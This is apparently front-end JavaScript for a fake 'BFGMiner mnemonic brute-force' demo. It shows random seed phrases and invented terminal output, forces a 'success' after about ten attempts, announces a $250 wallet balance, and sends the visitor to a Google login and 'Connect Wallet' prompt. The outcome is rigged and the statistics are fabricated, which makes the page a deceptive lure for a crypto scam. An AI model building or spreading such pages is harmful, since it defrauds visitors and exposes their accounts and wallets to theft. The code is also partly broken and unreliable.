/* Clean BFGMiner Mnemonic Brute-Force Animation - From Scratch
 * Features: Terminal simulation, stats panel, speed controls, forced success after ~10 attempts
 * Redirects to /login/google with $250 balance message on success
 * Robust DOM handling, no dependencies beyond basic JS
 */

const BIP39_WORDS = ['abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act', 'action', 'actor', 'actress', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult', 'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'agent', 'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert', 'alien', 'all', 'alley', 'allow', 'almost', 'alone', 'alpha', 'already', 'also', 'alter', 'always', 'amateur', 'amazing', 'among', 'amount', 'amused', 'analyst', 'anchor', 'ancient', 'anger', 'angle', 'angry', 'animal', 'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique', 'anxiety', 'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'arch', 'arctic', 'area', 'arena', 'argue', 'arm', 'armed', 'armor', 'army', 'around', 'arrange', 'arrest', 'arrive'];

const COMMANDS = [
  'bfgminer --scan 1 --set-device BITMAIN:clock=800',
  'cgminer --version',
  'nvidia-smi --query-gpu=temperature.gpu,utilization.gpu --format=csv',
  'ps aux | grep miner',
  'df -h /dev/shm',
  'echo "Starting brute-force sequence..."',
  'watch -n 1 "date"',
  'tail -f /var/log/miner.log'
];

const RESPONSES = {
  'bfgminer': ['[BFGMiner] 6.2.2 | Started: 2024-01-01 12:00:00', '[Pool 1] Stratum connection established', '[Device 0] 1.5 GH/s | Temp: 65C | Accepted: 1234', '[Summary] Total hashrate: 3.2 GH/s'],
  'nvidia-smi': ['GPU 0, Temp: 68C, Util: 98%', 'GPU 1, Temp: 72C, Util: 100%', 'GPU 2, Temp: 70C, Util: 99%'],
  'ps': ['root 12345  2.1  1.2  miner.py', 'user 67890  1.8  0.9  bfgminer'],
  'default': ['Command completed.', 'Status: OK', 'Hashrate stable.']
};

class MnemonicSimulator {
  constructor() {
    this.running = false;
    this.paused = false;
    this.speed = 5;
    this.attempts = 0;
    this.startTime = 0;
    this.intervalId = null;
    this.statsId = null;
    this.commandId = null;
    this.elements = this.getElements();
    this.initControls();
  }

  getElements() {
    const els = {};
    const ids = ['demo-modal', 'phrase-scroller', 'command-output', 'demo-status', 'attempts-per-sec', 'total-attempts', 'success-rate', 'elapsed-time', 'progress-bar', 'progress-text', 'hash-rate', 'pool-status', 'speed-slider', 'speed-display', 'play-pause-btn'];
    ids.forEach(id => {
      els[id] = document.getElementById(id);
    });
    return els;
  }

  initControls() {
    if (!this.elements.speedSlider) return;
    this.elements.speedSlider.addEventListener('input', (e) => {
      this.speed = parseInt(e.target.value);
      this.elements.speedDisplay.textContent = `${this.speed}x`;
      this.updateSpeed();
    });

    if (this.elements['play-pause-btn']) {
      this.elements['play-pause-btn'].addEventListener('click', () => this.togglePause());
    }
  }

  generatePhrase() {
    let phrase = '';
    for (let i = 0; i < 12; i++) {
      phrase += BIP39_WORDS[Math.floor(Math.random() * BIP39_WORDS.length)] + ' ';
    }
    return phrase.trim();
  }

  addPhrase(phrase, status = 'trying') {
    if (!this.elements['phrase-scroller']) return;
    const div = document.createElement('div');
    div.className = `mnemonic-phrase ${status}`;
    div.innerHTML = `<span class="attempt-num">[${this.attempts.toString().padStart(8, '0')}]</span> <span class="status-dot ${status}"></span> ${phrase}`;
    this.elements['phrase-scroller'].appendChild(div);
    if (this.elements['phrase-scroller'].children.length > 50) {
      this.elements['phrase-scroller'].removeChild(this.elements['phrase-scroller'].firstChild);
    }
    this.elements['phrase-scroller'].scrollTop = this.elements['phrase-scroller'].scrollHeight;
  }

  addCommand(cmd, resp) {
    if (!this.elements['command-output']) return;
    const line = document.createElement('div');
    line.className = 'terminal-line command';
    line.textContent = `root@rig:~$ ${cmd}`;
    this.elements['command-output'].appendChild(line);

    setTimeout(() => {
      const out = document.createElement('div');
      out.className = 'terminal-line output';
      out.textContent = resp;
      this.elements['command-output'].appendChild(out);
      this.elements['command-output'].scrollTop = this.elements['command-output'].scrollHeight;
      if (this.elements['command-output'].children.length > 30) {
        this.elements['command-output'].removeChild(this.elements['command-output'].firstChild);
      }
    }, 300);
  }

  updateStats() {
    if (!this.running) return;
    const elapsed = (Date.now() - this.startTime) / 1000;
    const aps = Math.round(this.attempts / elapsed) || 0;
    const hrate = Math.floor(Math.random() * 500 + 1000);

    if (this.elements['attempts-per-sec']) this.elements['attempts-per-sec'].textContent = aps;
    if (this.elements['total-attempts']) this.elements['total-attempts'].textContent = this.attempts.toLocaleString();
    if (this.elements['hash-rate']) this.elements['hash-rate'].textContent = `${hrate} MH/s`;
    if (this.elements['elapsed-time']) {
      const secs = Math.floor(elapsed % 60);
      const mins = Math.floor((elapsed / 60) % 60);
      const hrs = Math.floor(elapsed / 3600);
      this.elements['elapsed-time'].textContent = `${hrs.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    }

    const progress = Math.min(100, (this.attempts / 100) * 10);
    if (this.elements['progress-bar']) this.elements['progress-bar'].style.width = `${progress}%`;
    if (this.elements['progress-text']) this.elements['progress-text'].textContent = `${progress.toFixed(1)}%`;

    if (this.attempts >= 10) this.triggerSuccess();
  }

  triggerSuccess() {
    this.running = false;
    clearInterval(this.intervalId);
    clearInterval(this.statsId);
    clearInterval(this.commandId);

    if (this.elements['demo-status']) this.elements['demo-status'].textContent = 'SUCCESS! $250 BALANCE FOUND';

    // Success overlay
    const overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:10000;display:flex;align-items:center;justify-content:center;';
    overlay.innerHTML = `
      <div style="background:#1a1a1a;padding:2rem;border-radius:1rem;text-align:center;max-width:400px;color:white;">
        <h2 style="font-size:2rem;margin-bottom:1rem;color:#4ade80;">Wallet Unlocked!</h2>
        <p style="margin-bottom:1rem;">Discovered mnemonic with $250 balance.</p>
        <p style="font-size:1.2rem;font-weight:bold;color:#4ade80;">Balance: $250.00</p>
        <button onclick="window.location.href='/login/google'" style="background:#f59e0b;color:white;padding:0.75rem 1.5rem;border:none;border-radius:0.5rem;font-size:1rem;margin-top:1rem;cursor:pointer;">Login & Connect Wallet</button>
      </div>
    `;
    document.body.appendChild(overlay);

    // Auto redirect
    setTimeout(() => window.location.href = '/login/google', 4000);
  }

  updateSpeed() {
    if (!this.running) return;
    clearInterval(this.intervalId);
    clearInterval(this.commandId);
    this.intervalId = setInterval(() => this.runAttempt(), Math.max(100, 1000 / this.speed));
    this.commandId = setInterval(() => this.runCommand(), Math.max(3000, 15000 / this.speed));
  }

  togglePause() {
    this.paused = !this.paused;
    if (this.elements['demo-status']) this.elements['demo-status'].textContent = this.paused ? 'PAUSED' : 'RUNNING';
    const btn = this.elements['play-pause-btn'];
    if (btn) btn.innerHTML = this.paused ? '<i data-lucide="play"></i>' : '<i data-lucide="pause"></i>';
  }

  runAttempt() {
    if (!this.running || this.paused) return;
    const phrase = this.generatePhrase();
    this.addPhrase(phrase, 'trying');
    setTimeout(() => {
      if (Math.random() < 0.01 || this.attempts >= 10) {
        this.addPhrase(phrase, 'success');
      } else {
        this.addPhrase(phrase, 'failed');
      }
      this.attempts++;
    }, 200);
  }

  runCommand() {
    if (!this.running || this.paused) return;
    const cmd = COMMANDS[Math.floor(Math.random() * COMMANDS.length)];
    const key = cmd.includes('bfgminer') ? 'bfgminer' : cmd.includes('nvidia') ? 'nvidia-smi' : cmd.includes('ps') ? 'ps' : 'default';
    const resp = RESPONSES[key][Math.floor(Math.random() * RESPONSES[key].length)];
    this.addCommand(cmd, resp);
  }

  start() {
    if (this.running) return;
    this.running = true;
    this.attempts = 0;
    this.startTime = Date.now();
    if (this.elements['phrase-scroller']) this.elements['phrase-scroller'].innerHTML = '';
    if (this.elements['command-output']) this.elements['command-output'].innerHTML = '<div style="color:#10b981;">BFGMiner v6.2 - Brute-Force Mode Active</div>';
    if (this.elements['demo-status']) this.elements['demo-status'].textContent = 'INITIALIZING...';

    setTimeout(() => {
      if (this.elements['demo-status']) this.elements['demo-status'].textContent = 'BRUTE-FORCING MNEMONICS...';
      this.updateSpeed();
      this.statsId = setInterval(() => this.updateStats(), 1000);
      this.runCommand();
    }, 1500);

    if (this.elements['demo-modal']) {
      this.elements['demo-modal'].classList.remove('hidden');
      document.body.style.overflow = 'hidden';
    }
  }

  stop() {
    this.running = false;
    clearInterval(this.intervalId);
    clearInterval(this.statsId);
    clearInterval(this.commandId);
    if (this.elements['demo-modal']) {
      this.elements['demo-modal'].classList.add('hidden');
      document.body.style.overflow = 'auto';
    }
  }
}

let sim;
document.addEventListener('DOMContentLoaded', () => {
  sim = new MnemonicSimulator();
});

function showDemo() {
  if (sim) sim.start();
}

function closeDemo() {
  if (sim) sim.stop();
}

// Escape key to close
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && sim) sim.stop();
});
